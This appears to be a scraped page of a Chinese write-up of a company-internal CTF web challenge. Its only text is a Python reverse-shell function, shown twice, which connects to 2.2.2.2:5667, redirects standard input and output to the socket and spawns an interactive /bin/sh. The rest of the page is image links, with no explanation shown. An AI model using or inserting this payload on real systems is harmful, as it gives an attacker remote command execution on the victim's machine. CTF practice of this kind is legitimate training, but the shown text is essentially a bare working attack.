# 公司内部CTF的初赛web题

> 原文: https://www.ctfiot.com/91551.html
> ID: 91551

def test(args={}): import socket import subprocess import os s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect(("2.2.2.2",5667)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p=subprocess.call(["/bin/sh","-i"]) return "ok"


```
def test(args={}): import socket import subprocess import os s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect(("2.2.2.2",5667)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p=subprocess.call(["/bin/sh","-i"]) return "ok"
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/1-1673431173.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/0-1673431173.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/0-1673431175.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/8-1673431175.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/6-1673431177.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/4-1673431177.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/8-1673431178.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/3-1673431179.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/1-1673431179.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/0-1673431180.png)